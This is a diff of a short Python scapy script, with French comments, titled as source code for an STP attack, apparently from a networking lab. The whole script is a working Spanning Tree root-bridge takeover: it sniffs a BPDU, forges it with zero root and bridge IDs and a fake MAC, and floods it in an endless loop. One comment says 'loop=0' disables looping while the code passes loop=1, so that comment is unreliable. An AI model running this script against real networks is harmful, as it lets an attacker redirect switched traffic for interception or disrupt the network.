@@ -1,19 +1,27 @@
-#!/usr/bin/env python3
-#Import scapy
+#!/usr/bin/python3
+'''Code source pour l'attaque STP'''
+#Importation de toutes les fonctionnalités de la bibliothèque scapy
 from scapy.all import *
-#Capture STP frame
-bpdu = sniff(filter="ether dst 01:80:c2:00:00:00",count=1, iface="eth0")    
-#Change the MAC address in the frame to the following:
-bpdu[0].src="00:00:00:00:00:01"
-#Set Rootid
-bpdu[0].rootid=0
-#Set rootmac
-bpdu[0].rootmac="00:00:00:00:00:01"
-#Set Bridgeid
-bpdu[0].bridgeid=0  
-#Set rootmac
-bpdu[0].bridgemac="00:00:00:00:00:01"
-#Show changed frame
-bpdu[0].show()
-#Loop to send multiple frames into the network:
-sendp(bpdu[0], loop=1, verbose=1, iface="eth0")
+
+#Variable dont nous avons besoin afin de spécifier l'interface au réseau duquel est envoyé les paquets
+interface = "enxa0cec8f3e4df"
+
+#Utilisation de la fonction "sniff" pour capturer une trame STP avec une adresse de destination de multidiffusion (01:80:c2:00:00:00)
+trame = sniff(filter="ether dst 01:80:c2:00:00:00",count=1, iface=interface)
+trame.show()
+#Changement de l'adresse MAC source de la trame en "00:00:00:00:00:01"
+trame[0].src="00:00:00:00:00:01"
+#Modification de l'identifiant du switch racine (rootid) à 0 afin de mettre en place une nouvelle élection
+trame[0].rootid=0
+#Modification de l'adresse MAC du switch racine (rootmac) à "00:00:00:00:00:01"
+trame[0].rootmac="00:00:00:00:00:01"
+#Modification de l'identifiant du pont (bridgeid) à 0
+trame[0].bridgeid=0
+#Modification de l'adresse MAC du pont (bridgemac) à "00:00:00:00:00:01"
+trame[0].bridgemac="00:00:00:00:00:01"
+#Utilisation de la fonction "show" afin d'afficher les détails de la trame modifiée
+trame[0].show()
+# Utilisation de la fonction "sendp" afin d'envoyer la trame
+# La commande "loop=0" indique de ne pas envoyer la trame en boucle
+# La commande "verbose=1" indique d'afficher des informations détaillées lors l'envoi.
+sendp(trame[0], loop=1, verbose=1, iface=interface)
